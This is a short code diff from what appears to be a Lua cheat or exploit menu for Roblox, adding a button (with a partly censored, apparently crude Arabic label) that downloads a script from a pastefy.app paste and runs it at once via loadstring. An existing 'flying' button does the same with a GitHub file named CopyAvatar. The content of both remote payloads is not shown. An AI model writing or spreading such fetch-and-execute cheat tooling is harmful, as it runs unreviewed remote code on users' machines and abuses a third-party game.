@@ -703,6 +703,13 @@ Spin.AngularVelocity = Vector3.new(100,Spinspeed,0)
   end
 })
 AddButton(Main, {
+  Name = "تفرك بـ***",
+  Callback = function()
+    loadstring(game:HttpGet("https://pastefy.app/YZoglOyJ/raw"))()
+  end
+})
+
+AddButton(Main, {
   Name = "الطيران",
   Callback = function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/ahmidd409/-/refs/heads/main/CopyAvatar.txt"))()
